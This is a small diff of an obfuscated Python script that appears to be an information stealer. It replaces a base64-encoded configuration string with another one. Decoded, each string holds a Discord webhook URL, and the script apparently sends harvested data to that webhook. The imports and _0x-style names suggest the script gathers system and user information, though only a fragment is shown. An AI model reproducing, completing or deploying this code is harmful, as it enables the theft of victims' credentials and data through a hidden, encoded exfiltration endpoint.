@@ -10,7 +10,7 @@ _0xInstallDependencies()
 import os, sys, subprocess, socket, platform, zipfile, shutil, ctypes, stat
 import datetime, json, requests, base64, time, re, random, getpass, uuid
 
-_config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwOTkxMzQ3OTQzODUzNjc0NS8tT3NCWFIyeXVTN1NrYS1ua0xDcHlBNFhLNjlXR001a0V1b0REakhfTkU3OThGNHcwVTRJU2laa0VHRzltZEMyU0dmN3xodHRwczovL2kuaW1ndXIuY29tL0c4UVIwZjcucG5n"
+_config_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTk5MTkxNTgzNzY1MzA3My9FRjZYUnBWS2xHdllkTkhiWGZkblFXcWtYSlNuTmZTRk1CeFNZT0xwUkwxQ0RmUWkwSVZUcXpzRF9XOEZmUmZvdTZ5eA=="
 
 def _0xDecodeConfig(_enc):
     _d = base64.b64decode(_enc).decode('utf-8')
